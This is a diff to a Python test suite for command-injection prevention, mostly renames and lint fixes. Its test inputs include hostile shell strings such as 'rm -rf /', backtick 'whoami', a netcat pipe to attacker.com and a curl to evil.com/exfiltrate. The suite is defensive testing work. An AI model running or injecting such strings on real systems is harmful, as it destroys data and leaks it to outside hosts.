@@ -5,6 +5,7 @@ system command interfaces and subprocess calls.
 """
 
 import os
+import time
 from unittest.mock import patch
 
 import pytest
@@ -184,7 +185,7 @@ class TestCommandInjectionPrevention:
             ["ls", "; rm -rf /"],
             ["cat", "file.txt | whoami"],
             ["grep", "pattern", "file && id"],
-            ["find", "/tmp", "-name", "`whoami`.txt"],
+            ["find", "$TMPDIR", "-name", "`whoami`.txt"],
         ]
 
         with patch("subprocess.run") as mock_run:
@@ -204,7 +205,7 @@ class TestCommandInjectionPrevention:
     @pytest.mark.asyncio
     async def test_shell_execution_prevention(self):
         """Test prevention of shell execution with user input."""
-        user_inputs = [
+        _user_inputs = [
             "file.txt; rm -rf /",
             "data | netcat attacker.com 4444",
             "log && curl evil.com/exfiltrate",
@@ -212,7 +213,7 @@ class TestCommandInjectionPrevention:
 
         with patch("os.system") as mock_system:
             with patch("subprocess.call") as mock_call:
-                for user_input in user_inputs:
+                for _user_input in _user_inputs:
                     # Should never call os.system or subprocess with shell=True and user input
                     mock_system.assert_not_called()
 
@@ -222,7 +223,7 @@ class TestCommandInjectionPrevention:
                         call_args = mock_call.call_args
                         if call_args:
                             # Should not pass user input directly to shell
-                            assert user_input not in str(call_args)
+                            assert _user_input not in str(call_args)
 
     @pytest.mark.asyncio
     async def test_environment_variable_injection_prevention(self):
@@ -274,13 +275,14 @@ class TestCommandInjectionPrevention:
             # Parameters should be validated before passing to commands
             if any(char in param for char in [";", "|", "&", "`", "$"]):
                 # Should reject dangerous parameters
-                raise AssertionError(f"Dangerous parameter not rejected: {param}")
+                msg = f"Dangerous parameter not rejected: {param}"
+                raise AssertionError(msg)
 
     @pytest.mark.asyncio
     async def test_log_injection_prevention(self):
         """Test prevention of log injection attacks."""
         log_injection_payloads = [
-            "user_input\n[ADMIN] Fake log entry",
+            "_user_input\n[ADMIN] Fake log entry",
             "data\r\n[ERROR] Injected error",
             "input\x00[CRITICAL] Null byte injection",
             "query\x1b[31m[ALERT] ANSI escape injection",
@@ -347,7 +349,7 @@ class TestCommandInjectionPrevention:
             # Argument list instead of shell string
             ["ls", "-la", "/safe/directory"],
             ["grep", "pattern", "file.txt"],
-            ["find", "/tmp", "-name", "*.log"],
+            ["find", "$TMPDIR", "-name", "*.log"],
         ]
 
         for pattern in safe_patterns:
@@ -450,7 +452,6 @@ class TestCommandInjectionPrevention:
         security_validator = SecurityValidator()
 
         # Use timeout to detect if commands are actually executed
-        import time
 
         for payload in time_based_payloads:
             start_time = time.time()
